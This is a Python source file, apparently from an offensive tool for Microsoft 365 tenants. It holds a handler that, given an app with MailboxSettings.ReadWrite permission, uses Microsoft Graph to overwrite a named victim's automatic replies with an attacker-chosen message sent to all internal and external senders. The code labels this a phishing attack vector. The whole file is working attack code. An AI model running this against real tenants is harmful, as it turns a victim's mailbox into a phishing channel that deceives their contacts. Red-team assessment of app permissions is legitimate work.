from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
from datetime import datetime, timedelta
import requests

logger = logger.createLogger('attacks.handlers.mailboxPhish_handler')


class MailboxPhish_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if "MailboxSettings.ReadWrite" in request.roles:
            status = False
            attack_name = "MailboxSettingsPhishVectors"
            message = ""
            error = "MailboxSettingsPhishVectors - failed"
            conf = request.attack_config['mailbox']
            logger.debug("MailboxSettings.ReadWrite - Allows the app to create, read, update, and delete user's mailbox settings without a signed-in user.")

            logger.debug("Attack vector - phishing.")
            try:
                current_time = datetime.now()
                formatted_time = current_time.strftime("%Y-%m-%dT%H:%M:%S.%f")
                formatted_time = formatted_time[:-3] + "000" + formatted_time[-3:]

                one_hour_delta = timedelta(hours=1)
                updated_time = current_time + one_hour_delta

                # Format the updated time string
                formatted_nexthour = updated_time.strftime("%Y-%m-%dT%H:%M:%S.%f")

                # Add trailing zeros to microseconds if needed
                formatted_nexthour = formatted_nexthour[:-3] + "000" + formatted_nexthour[-3:]

                create_message_URL = "https://graph.microsoft.com/v1.0/users/" + conf["victim"] +"/mailboxSettings"
                message_obj = {
                    "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#Me/mailboxSettings",
                    "automaticRepliesSetting": {
                        "status": "AlwaysEnabled",
                        "externalAudience": "all",
                        "externalReplyMessage": conf["message"],
                        "internalReplyMessage": conf["message"],
                        "scheduledStartDateTime": {
                        "dateTime": formatted_time,
                        "timeZone": "UTC"
                        },
                        "scheduledEndDateTime": {
                        "dateTime": formatted_nexthour,
                        "timeZone": "UTC"
                        }
                    }
                }

                result = requests.patch(create_message_URL, json=message_obj, headers=request.request_headers)
                if result.status_code == 200:
                    message += "changed the automatic reply of %s   \n" % (conf["victim"])
                    status = True
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in mailboxPhish_handler function")

            
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))



        return super().handle(request,responses)
